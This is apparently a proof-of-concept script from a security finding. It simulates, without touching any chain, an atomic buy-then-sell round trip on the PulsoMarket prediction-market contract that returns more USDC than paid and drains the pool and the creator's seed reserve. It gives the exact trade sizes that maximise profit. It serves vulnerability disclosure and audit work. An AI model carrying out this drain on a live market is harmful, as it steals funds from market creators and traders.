#!/usr/bin/env python3
"""Exact integer-math replica of PulsoMarket.buyShares()/sellShares() (github.com/Littania/pulso-market @60aac48).

Reproduces the risk-free atomic round-trip drain WITHOUT touching any chain: it replays the deployed contract's
exact Solidity integer semantics (PRECISION=1e6, FEE_BPS=150, floor division, Math.mulDiv = floor) on a fresh
market created with the factory defaults (initialLiquidity=1000 USDC, virtualMultiplier=10x). A single attacker
tx buyShares(YES, X) then sellShares(YES, allShares) returns MORE USDC than paid, draining pool + seedReserve.

    python3 poc_sim.py

Stdlib only. Read-only proof (no RPC). See FINDING.md for the write-up.
"""
PRECISION = 1_000_000
BPS = 10_000
FEE_BPS = 150            # 1.5% per leg
MIN_P, MAX_P = 1000, 999_000
USDC = 10 ** 6


def mulDiv(a, b, d):     # OZ Math.mulDiv on values that don't overflow 512-bit -> plain floor
    return (a * b) // d


def clamp(p):
    return MIN_P if p < MIN_P else (MAX_P if p > MAX_P else p)


class Market:
    """The exact on-chain state machine for the YES side (NO is symmetric)."""

    def __init__(self, initial_liq_usdc=1000, virtual_mult=10):
        self.L = initial_liq_usdc * USDC * virtual_mult   # liquidityDepth (virtual)
        self.Y = 0                                        # totalYesShares
        self.N = 0                                        # totalNoShares
        self.pool = 0                                     # totalUsdcPool (trader deposits)
        self.seed = initial_liq_usdc * USDC               # seedReserve (creator's deposit)
        self.fees = 0                                     # accumulatedFees

    def price_yes(self):
        yt, nt = self.Y + self.L, self.N + self.L
        tot = yt + nt
        if tot == 0:
            return 500_000
        return clamp((yt * PRECISION) // tot)

    def buy_yes(self, usdc_amount):                       # PulsoMarket.sol:238-288
        fee = (usdc_amount * FEE_BPS) // BPS
        net = usdc_amount - fee
        self.fees += fee
        self.pool += net
        p = self.price_yes()                              # BEFORE minting
        s = (net * PRECISION) // p                         # whole batch at pre-mint spot
        assert s > 0
        self.Y += s
        return s, p

    def sell_yes(self, amount):                          # PulsoMarket.sol:297-343
        p = self.price_yes()                              # BEFORE burning (== post-buy price)
        self.Y -= amount
        gross = mulDiv(amount, p, PRECISION)              # whole batch at pre-burn spot
        fee = mulDiv(gross, FEE_BPS, BPS)
        out = gross - fee
        self.fees += fee
        if gross <= self.pool:
            self.pool -= gross
        else:
            from_seed = gross - self.pool
            if from_seed > self.seed:
                raise AssertionError("insufficient liquidity (require fromSeed <= seedReserve)")
            self.pool = 0
            self.seed -= from_seed
        return out, p


def roundtrip(buy_usdc):
    m = Market()
    s, pb = m.buy_yes(buy_usdc)
    out, ps = m.sell_yes(s)                                # same attacker, same tx
    return out - buy_usdc, s, pb, ps, m.pool, m.seed, out


if __name__ == "__main__":
    print("PulsoMarket atomic buy->sell round-trip (fresh market, factory defaults: seed=1000 USDC, 10x virtual)")
    print("-" * 100)
    for amt in [322, 1000, 3757, 5000, 8000]:
        try:
            pr, s, pb, ps, pool, seed, out = roundtrip(amt * USDC)
            print(f"buy {amt:>5} USDC -> shares {s/1e6:9.2f} | priceBuy {pb/1e4:5.2f}c priceSell {ps/1e4:5.2f}c"
                  f" | out {out/1e6:8.2f} | PROFIT {pr/1e6:+8.2f} ({100*pr/(amt*USDC):+5.1f}%)"
                  f" | pool->{pool/1e6:.2f} seed->{seed/1e6:.2f}")
        except AssertionError as e:
            print(f"buy {amt:>5} USDC -> REVERT ({e})")
    print("-" * 100)
    print("A ~3757 USDC round trip nets +872.71 USDC (23.2%) and empties pool + ~99.96% of the creator's seed,")
    print("in ONE transaction, on the market's FIRST trade. No flash loan, no oracle, no second party.")
